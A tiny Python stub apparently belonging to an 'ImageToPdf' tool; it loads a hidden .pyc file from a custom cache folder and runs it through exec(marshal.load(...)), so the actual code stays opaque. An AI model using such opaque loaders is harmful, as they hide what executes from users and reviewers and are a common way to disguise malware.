
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'ImageToPdf_92362395dbdf49ecbd1632bc6b9cdb4d.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
